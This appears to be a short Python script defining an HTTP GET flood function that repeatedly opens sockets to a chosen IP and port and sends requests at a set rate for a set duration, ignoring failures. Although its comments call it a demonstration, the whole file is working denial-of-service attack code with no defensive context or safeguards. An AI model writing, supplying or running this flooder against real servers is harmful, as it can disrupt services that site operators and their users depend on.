import socket
import time

def http_flood(target_ip, target_port, duration, rate):
    """
    HTTP GET flood demonstration.
    Opens a socket and sends HTTP GET requests at the specified rate.
    """
    print(f"[INFO] Starting HTTP flood on {target_ip}:{target_port} for {duration} seconds at ~{rate} requests/sec.")
    start_time = time.time()
    request_count = 0

    while True:
        if time.time() - start_time > duration:
            break
        
        try:
            # Create a new socket each time or reuse; new socket is simpler for demonstration
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: close\r\n\r\n"
            s.send(http_request.encode())
            s.close()
            request_count += 1
        except Exception as e:
            pass  # For demonstration, ignore failures

        time.sleep(1 / rate)

    print(f"[INFO] HTTP flood completed. Total requests sent: {request_count}")
